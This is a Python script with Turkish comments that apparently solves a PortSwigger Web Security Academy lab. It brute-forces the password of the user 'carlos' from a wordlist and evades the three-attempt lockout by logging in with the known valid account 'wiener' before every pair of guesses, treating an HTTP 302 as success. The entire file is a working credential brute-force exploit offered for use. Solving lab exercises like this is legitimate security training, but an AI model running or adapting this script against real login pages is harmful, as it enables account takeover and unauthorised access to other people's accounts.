import requests
import sys

def exploit_lockout_bypass(url, wordlist_path):
    # Laboratuvar URL'si (Kendi URL'niz ile değiştirin)
    target_url = f"{url}/login"
    
    # Bilinen geçerli kimlik bilgileri (Sayacı sıfırlamak için)
    valid_username = "wiener"
    valid_password = "peter"
    
    # Hedef kullanıcı
    target_username = "carlos"
    
    # Şifre listesini oku
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[-] Hata: {wordlist_path} dosyası bulunamadı.")
        sys.exit(1)

    print(f"[*] Toplam {len(passwords)} şifre denenecek.")
    print("[*] Brute-force saldırısı başlatılıyor...\n")

    # Oturum (Session) başlat, böylece cookie'ler otomatik yönetilir
    session = requests.Session()

    # Şifreleri ikişerli gruplar halinde işle (3 deneme sınırını aşmamak için)
    for i in range(0, len(passwords), 2):
        
        # 1. ADIM: Sayacı sıfırlamak için geçerli kullanıcı ile giriş yap
        reset_data = {"username": valid_username, "password": valid_password}
        session.post(target_url, data=reset_data)
        
        # 2. ADIM: Hedef kullanıcı için sıradaki 2 şifreyi dene
        for j in range(2):
            if i + j < len(passwords):
                candidate_password = passwords[i + j]
                attack_data = {"username": target_username, "password": candidate_password}
                
                # 302 yönlendirmesini yakalamak için allow_redirects=False yapıyoruz
                response = session.post(target_url, data=attack_data, allow_redirects=False)
                
                # Eğer HTTP statü kodu 302 ise giriş başarılıdır
                if response.status_code == 302:
                    print("\n[+] BINGO! Başarılı giriş tespit edildi.")
                    print(f"[+] Carlos'un şifresi: {candidate_password}")
                    return
                else:
                    sys.stdout.write(f"\r[-] Deneniyor... {candidate_password:<20}")
                    sys.stdout.flush()

    print("\n\n[-] Wordlist sonuna gelindi, geçerli şifre bulunamadı.")

if __name__ == "__main__":
    # Laboratuvar URL'nizi buraya girin (Örn: https://0a620095...web-security-academy.net)
    LAB_URL = "https://0a620095038dc97880bba34f002d007e.web-security-academy.net" 
    WORDLIST_FILE = "passwords.txt" # Kendi wordlist dosyanızın yolunu yazın
    
    exploit_lockout_bypass(LAB_URL, WORDLIST_FILE)